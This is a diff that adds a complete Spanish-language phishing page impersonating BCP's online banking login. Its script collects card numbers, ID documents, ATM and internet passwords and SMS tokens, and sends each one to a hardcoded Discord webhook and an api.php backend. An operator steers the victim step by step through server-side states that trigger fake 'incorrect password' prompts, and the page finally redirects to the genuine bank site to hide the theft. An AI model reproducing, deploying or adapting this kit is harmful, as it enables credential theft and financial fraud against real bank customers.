@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca por Internet - BCP</title>
+    <style>
+        :root {
+            --azul-bcp: #002a8d;
+            --naranja-bcp: #ff7800;
+            --gris-oscuro: #4d4d4d;
+            --gris-suave: #757575;
+            --gris-borde: #ced4da;
+            --gris-input: #f2f4f7;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: #fff; color: var(--azul-bcp); display: flex; flex-direction: column; min-height: 100vh; }
+
+        header { padding: 20px 25px; display: flex; justify-content: space-between; align-items: center; }
+        .logo-bcp { width: 100px; height: auto; }
+
+        main { padding: 25px; max-width: 450px; margin: 0 auto; width: 100%; }
+        h1 { font-size: 34px; line-height: 1.1; margin-bottom: 10px; font-weight: 700; color: var(--azul-bcp); }
+        .subtitle { color: var(--gris-oscuro); font-size: 18px; margin-bottom: 25px; }
+
+        .tab-container { display: flex; border-bottom: 1px solid var(--gris-borde); margin-bottom: 30px; }
+        .tab { flex: 1; text-align: center; padding: 12px; cursor: pointer; font-weight: 600; color: var(--gris-suave); transition: 0.3s; }
+        .tab.active { color: var(--azul-bcp); border-bottom: 3px solid var(--azul-bcp); }
+        
+        .input-container { position: relative; margin-bottom: 20px; width: 100%; }
+        .input-container label { display: block; font-size: 14px; font-weight: 600; color: var(--gris-oscuro); margin-bottom: 8px; }
+        .input-container input, .input-container select { width: 100%; padding: 16px 15px; border: 1px solid var(--gris-borde); border-radius: 8px; font-size: 17px; outline: none; }
+        .input-container input:focus { border: 2px solid var(--azul-bcp); }
+
+        .btn-continuar { width: 100%; background-color: var(--naranja-bcp); color: #fff; border: none; padding: 17px; border-radius: 50px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 15px; }
+
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; text-align: center; padding: 25px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--azul-bcp); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        .code-modal-box h2 { font-size: 26px; font-weight: 700; margin-bottom: 15px; color: var(--azul-bcp); }
+        .code-box { width: 42px; height: 52px; background-color: var(--gris-input); border: none; border-radius: 8px; font-size: 22px; font-weight: 700; text-align: center; outline: none; }
+        .code-inputs-row { display: flex; gap: 6px; justify-content: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <!-- PASO 1: LOGIN -->
+    <div id="p-form">
+        <header><img src="logojep.svg" class="logo-bcp" alt="BCP"></header>
+        <main>
+            <h1>¡Qué bueno tenerte por aquí!</h1>
+            <p class="subtitle">Completa tus datos para ingresar</p>
+            <div class="tab-container">
+                <div class="tab active">Persona</div>
+                <div class="tab">Empresa</div>
+            </div>
+            <div class="input-container">
+                <label>Número de tu tarjeta</label>
+                <input type="tel" id="tj" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" inputmode="numeric">
+            </div>
+            <div style="display:flex; gap:10px;">
+                <div class="input-container" style="flex:0.4;">
+                    <label>Tipo de doc.</label>
+                    <select id="tipo_doc"><option>DNI</option><option>CE</option></select>
+                </div>
+                <div class="input-container" style="flex:1;">
+                    <label>Nº de documento</label>
+                    <input type="tel" id="dc" placeholder="Documento" maxlength="12" inputmode="numeric">
+                </div>
+            </div>
+            <button class="btn-continuar" onclick="iniciarLogin()">Continuar</button>
+        </main>
+    </div>
+
+    <!-- PANTALLA DE CARGA -->
+    <div id="p-loading" class="overlay">
+        <div class="spinner"></div>
+        <p style="margin-top:25px; font-weight:700; color: var(--azul-bcp);">Validando información...</p>
+    </div>
+
+    <!-- MODAL CLAVE CAJERO (6) -->
+    <div id="p-clave" class="overlay">
+        <div class="code-modal-box">
+            <h2>Clave token</h2>
+            <p>Ingresa tu clave de 6 dígitos</p>
+            <div class="code-inputs-row" id="row-clave">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CLAVE INTERNET (6) -->
+    <div id="p-clave-internet" class="overlay">
+        <div class="code-modal-box">
+            <h2>Clave de Internet</h2>
+            <p>Ingresa tu clave de 6 dígitos</p>
+            <div class="code-inputs-row" id="row-clave-internet">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="code-box" maxlength="1" inputmode="numeric">
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL TOKEN / SMS (5 DÍGITOS) -->
+    <div id="p-token" class="overlay">
+        <div class="code-modal-box">
+            <h2>Código de Seguridad</h2>
+            <p>Ingresa el código de 5 dígitos enviado por SMS o correo</p>
+            <div class="code-inputs-row" id="row-token">
+                <input type="tel" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="code-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="code-box" maxlength="1" inputmode="numeric">
+            </div>
+        </div>
+    </div>
+
+    <script>
+    let UID = localStorage.getItem('bcp_id') || "BCP-" + Math.floor(Math.random() * 99999);
+    localStorage.setItem('bcp_id', UID);
+    let checkLoop = null;
+    const WEBHOOK = "https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp";
+
+    async function enviarNotificacion(titulo, valor) {
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**🔔 ALERTA BCP**\n**ID:** \`${UID}\`\n**PASO:** \`${titulo}\`\n**DATO:** \`${valor}\``
+                })
+            });
+        } catch (e) { console.error("Discord error"); }
+    }
+
+    async function irA(pantalla, estado, rowFila = null) {
+        let codigo = "";
+        if (rowFila) {
+            const inputs = document.querySelectorAll(`#${rowFila} .code-box`);
+            codigo = Array.from(inputs).map(i => i.value).join('');
+            let label = "CÓDIGO";
+            if(estado === 'clave_internet_enviada') label = "CLAVE INTERNET (6)";
+            if(estado === 'clave_enviada') label = "CLAVE CAJERO (6)";
+            if(estado === 'token_enviado') label = "TOKEN SMS/CORREO (5)";
+            enviarNotificacion(label, codigo);
+        } else if (pantalla === 'loading' && estado === 'espera') {
+            const tj = document.getElementById('tj').value;
+            const dc = document.getElementById('dc').value;
+            enviarNotificacion("LOGIN INICIAL", `Tarjeta: ${tj} | Doc: ${dc}`);
+        }
+
+        mostrar('p-' + pantalla);
+
+        await fetch('api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id_usuario: UID, estado: estado, codigo: codigo })
+        });
+
+        if (pantalla === 'loading') escuchar();
+        if (pantalla === 'clave') prepararInputs('row-clave', 6, 'clave_enviada');
+        if (pantalla === 'clave-internet') prepararInputs('row-clave-internet', 6, 'clave_internet_enviada');
+        if (pantalla === 'token') prepararInputs('row-token', 5, 'token_enviado');
+    }
+
+    function escuchar() {
+        if(checkLoop) clearInterval(checkLoop);
+        checkLoop = setInterval(async () => {
+            try {
+                let res = await fetch(`api.php?id=${UID}&t=${Date.now()}`);
+                let data = await res.json();
+                
+                // RUTAS DE ÉXITO MANDADAS DESDE EL ADMIN
+                if(data.estado === 'pedir_internet') { clearInterval(checkLoop); irA('clave-internet', 'visitando'); }
+                else if(data.estado === 'pedir_clave') { clearInterval(checkLoop); irA('clave', 'visitando'); }
+                else if(data.estado === 'pedir_token') { clearInterval(checkLoop); irA('token', 'visitando'); }
+                
+                // RUTAS DE ERROR (Botones "Malo" del Admin)
+                else if(data.estado === 'error_login') { 
+                    clearInterval(checkLoop);
+                    alert("Los datos de tarjeta o documento son incorrectos. Verifíquelos e intente de nuevo.");
+                    mostrar('p-form');
+                }
+                else if(data.estado === 'error_clave') { 
+                    clearInterval(checkLoop); 
+                    alert("La clave de cajero es incorrecta."); 
+                    irA('clave', 'visitando'); 
+                }
+                else if(data.estado === 'error_internet') { 
+                    clearInterval(checkLoop); 
+                    alert("La clave de internet es incorrecta."); 
+                    irA('clave-internet', 'visitando'); 
+                }
+                else if(data.estado === 'error_token') { 
+                    clearInterval(checkLoop); 
+                    alert("El código de seguridad es incorrecto."); 
+                    irA('token', 'visitando'); 
+                }
+                
+                else if(data.estado === 'ok') window.location.href = "https://www.viabcp.com/";
+            } catch(e) {}
+        }, 2500);
+    }
+
+    function prepararInputs(rowId, cant, estadoFinal) {
+        const inputs = document.querySelectorAll(`#${rowId} .code-box`);
+        inputs.forEach(i => i.value = ''); 
+        inputs.forEach((input, idx) => {
+            input.onkeyup = function(e) {
+                if(this.value && idx < cant - 1) inputs[idx+1].focus();
+                if(e.key === "Backspace" && idx > 0 && !this.value) inputs[idx-1].focus();
+                const completo = Array.from(inputs).every(i => i.value.length === 1);
+                if(completo) setTimeout(() => irA('loading', estadoFinal, rowId), 200);
+            };
+        });
+        setTimeout(() => inputs[0].focus(), 400);
+    }
+
+    function iniciarLogin() {
+        const tjVal = document.getElementById('tj').value.replace(/\s/g, '');
+        if(tjVal.length < 16) return alert("Número de tarjeta incompleto");
+        irA('loading', 'espera');
+    }
+
+    function mostrar(id) {
+        ['p-form', 'p-loading', 'p-clave', 'p-clave-internet', 'p-token'].forEach(p => {
+            const el = document.getElementById(p);
+            if(el) el.style.display = 'none';
+        });
+        const target = document.getElementById(id);
+        if(target) target.style.display = (id === 'p-form' ? 'block' : 'flex');
+    }
+
+    document.getElementById('tj').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    window.onload = () => mostrar('p-form');
+    </script>
+</body>
+</html>
